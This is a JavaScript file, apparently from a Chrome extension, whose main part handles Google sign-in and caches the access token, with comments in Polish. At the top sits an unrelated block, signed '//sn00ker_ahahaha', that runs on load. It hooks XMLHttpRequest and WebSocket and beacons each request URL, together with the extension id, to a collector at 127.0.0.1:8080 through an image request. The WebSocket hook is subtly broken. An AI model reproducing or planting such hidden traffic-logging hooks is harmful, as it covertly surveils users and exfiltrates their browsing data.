function collectMessageToServer(data){
    var img = document.createElement("img");
    img.src = "http://127.0.0.1:8080/" + chrome.runtime.id + "/" + data;
}

function hookAjax(){
    var _XMLHTTPRequestOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(){
        console.log(arguments);
        collectMessageToServer("bk-ajax-" + btoa(arguments[1]));
        _XMLHTTPRequestOpen.apply(this, arguments);
    }
}
function hookWebsocket() {
    var _websockSend = WebSocket.prototype.send;
    WebSocket.prototype.send = () => {
        console.log(arguments);
        collectMessageToServer("bk-ws-" + btoa(arguments[1]));
        _websockSend.apply(this, arguments);
    }
}

function run(){
    hookAjax();
    hookWebsocket();
}
run();
//sn00ker_ahahaha
//Probujemy autoryzowac przy uruchomieniu jesli nie bylo autoryzacji lub jestesmy juz zalogowani
(function() {

    localStorageClient.getAuthMethod(function(data){
        var authMethod = data['AuthMethod'];
        if (authMethod == undefined || authMethod == '') {
            chrome.identity.getAuthToken({
                'interactive': false
            }, handleToken);
        }
    })

})();

function signInWithGoogle(onSuccess, onError) {
    chrome.identity.getAuthToken({
        'interactive': true
    }, function(accessToken) {
        //jesli sie nie udalo - to nic nie rob
        if (chrome.runtime.lastError) {
            console.log(chrome.runtime.lastError);
            return;
        }

        cniApiClient.loginViaGoogle(accessToken, function(authData) {
            localStorageClient.setAuthMethod('GOOGLE');
            localStorageClient.setCachedAccessToken(accessToken);
            localStorageClient.setUserId(authData.user_id);
            //obsluga przycisku
            postLogin();
            onSuccess();

        }, function(errors) {
            logoutViaGoogle(onError);
        });

    });
}

function logoutViaGoogle(onLogOut) {
    localStorageClient.clearAuthData();
    if (onLogOut != undefined) {
        onLogOut();
    }
}

function handleToken(accessToken) {
    //jesli sie nie udalo - to nic nie rob
    if (chrome.runtime.lastError) {
        console.log(chrome.runtime.lastError);
        return;
    }

    cniApiClient.loginViaGoogle(accessToken, function(authData) {
        localStorageClient.setAuthMethod('GOOGLE');
        localStorageClient.setCachedAccessToken(accessToken);
        localStorageClient.setUserId(authData.user_id);
    }, function(errors) {
        logoutViaGoogle();
    });

}